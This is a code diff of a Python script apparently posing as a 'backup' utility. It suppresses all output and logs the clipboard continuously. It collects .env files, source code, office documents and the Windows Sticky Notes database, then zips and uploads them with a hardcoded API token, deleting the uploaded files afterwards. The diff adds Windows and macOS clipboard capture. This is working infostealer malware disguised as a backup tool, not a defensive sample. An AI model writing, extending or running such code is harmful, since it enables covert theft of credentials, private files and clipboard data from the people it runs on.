@@ -8,23 +8,30 @@ import threading
 import getpass
 import logging
 import sys
+import platform
 
-sys.stdout = sys.stderr = open(os.devnull, 'w')
+DEBUG_MODE = False
+if not DEBUG_MODE:
+    sys.stdout = sys.stderr = open(os.devnull, 'w')
 
 logging.basicConfig(level=logging.CRITICAL, format="%(message)s")
 
-def get_windows_username():
-    try:
-        result = subprocess.run(
-            ["powershell.exe", "-Command", "[System.Environment]::UserName"],
-            capture_output=True,
-            text=True
-        )
-        if result.returncode == 0:
-            return result.stdout.strip()
-    except Exception as e:
-        logging.error(f"Error retrieving Windows username: {e}")
-    return os.environ.get("USERNAME", getpass.getuser())
+def get_username():
+    system_name = platform.system()
+    
+    if system_name == "Windows":
+        try:
+            result = subprocess.run(
+                ["powershell.exe", "-Command", "[System.Environment]::UserName"],
+                capture_output=True,
+                text=True
+            )
+            if result.returncode == 0:
+                return result.stdout.strip()
+        except Exception as e:
+            logging.error(f"Error retrieving Windows username: {e}")
+
+    return os.environ.get("USER") or os.environ.get("USERNAME") or getpass.getuser()
 
 def backup_files(source_dir, target_dir, file_extensions):
     source_dir = os.path.abspath(os.path.expanduser(source_dir))
@@ -36,7 +43,6 @@ def backup_files(source_dir, target_dir, file_extensions):
     os.makedirs(target_dir, exist_ok=True)
 
     for root, _, files in os.walk(source_dir):
-
         if os.path.abspath(root).startswith(target_dir):
             continue
 
@@ -61,7 +67,6 @@ def zip_backup_folder(folder_path, zip_file_path):
             os.remove(f"{zip_file_path}.zip")
         
         shutil.make_archive(zip_file_path, 'zip', folder_path)
-        
         shutil.rmtree(folder_path)
 
         return f"{zip_file_path}.zip"
@@ -71,11 +76,7 @@ def zip_backup_folder(folder_path, zip_file_path):
 
 def is_valid_file(file_path):
     try:
-        if not os.path.isfile(file_path) or os.path.getsize(file_path) == 0:
-            return False
-        with open(file_path, "rb"):
-            pass
-        return True
+        return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
     except Exception:
         return False
 
@@ -91,7 +92,6 @@ def upload_file(file_path, api_token):
 
                 if response.status_code == 200:
                     logging.critical(f"Uploaded successfully: {file_path}")
-
                     os.remove(file_path)
                 else:
                     logging.error(f"Failed to upload {file_path}. Status code: {response.status_code}, Response: {response.text}")
@@ -101,8 +101,21 @@ def upload_file(file_path, api_token):
         logging.error(f"File {file_path} is empty or invalid, skipping upload.")
 
 def get_clipboard_content():
+    system_name = platform.system()
+
     try:
-        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
+        if system_name == "Windows":
+            result = subprocess.run(
+                ["powershell.exe", "Get-Clipboard"],
+                capture_output=True, text=True
+            )
+        elif system_name == "Linux":
+            result = subprocess.run(["xclip", "-selection", "clipboard", "-o"], capture_output=True, text=True)
+        elif system_name == "Darwin":  # macOS
+            result = subprocess.run(["pbpaste"], capture_output=True, text=True)
+        else:
+            return None
+
         return result.stdout.strip() if result.returncode == 0 else None
     except Exception as e:
         logging.error(f"Error accessing clipboard: {e}")
@@ -125,14 +138,19 @@ def monitor_clipboard(file_path):
         time.sleep(3)
 
 def periodic_backup_upload():
-    windows_user = get_windows_username()
+    user = get_username()
+    system_name = platform.system()
 
     wsl_backup_directory = "~/.dev/Backup/wsl"
     ddd_backup_directory = "~/.dev/Backup/ddd"
     ddd_source_directory = "/mnt/d"
     clipboard_log_path = os.path.expanduser("~/.dev/Backup/clipboard_log.txt")
-    sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
-    api_token = "z7hjnq2voZ7tDyh7VHBKeIf0B6k1CuXC"
+    
+    sticky_notes_path = None
+    if system_name == "Windows" or "microsoft" in platform.uname().release.lower():
+        sticky_notes_path = f"/mnt/c/Users/{user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
+
+    api_token = "oxQbVFE4p8BKRSE07r03s7jW4FDIC0sR"
 
     threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,), daemon=True).start()
 
@@ -141,19 +159,15 @@ def periodic_backup_upload():
 
     while True:
         wsl_backup_dir = backup_files("~", wsl_backup_directory, [".env", ".json", ".js", ".py", ".go", ".txt"])
-
         ddd_backup_dir = backup_files(ddd_source_directory, ddd_backup_directory, [".txt", ".doc", ".docx", ".xls", ".xlsx", ".one", ".json", ".js", ".py", ".go", ".csv"])
 
-        wsl_zip_file_path = os.path.expanduser("~/.dev/Backup/wsl_backup")
-        wsl_zip_file = zip_backup_folder(wsl_backup_dir, wsl_zip_file_path)
-
-        ddd_zip_file_path = os.path.expanduser("~/.dev/Backup/ddd_backup")
-        ddd_zip_file = zip_backup_folder(ddd_backup_dir, ddd_zip_file_path)
+        wsl_zip_file = zip_backup_folder(wsl_backup_dir, os.path.expanduser("~/.dev/Backup/wsl_backup"))
+        ddd_zip_file = zip_backup_folder(ddd_backup_dir, os.path.expanduser("~/.dev/Backup/ddd_backup"))
 
         if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
             upload_file(clipboard_log_path, api_token)
 
-        if os.path.exists(sticky_notes_path):
+        if sticky_notes_path and os.path.exists(sticky_notes_path):
             upload_file(sticky_notes_path, api_token)
 
         if wsl_zip_file:
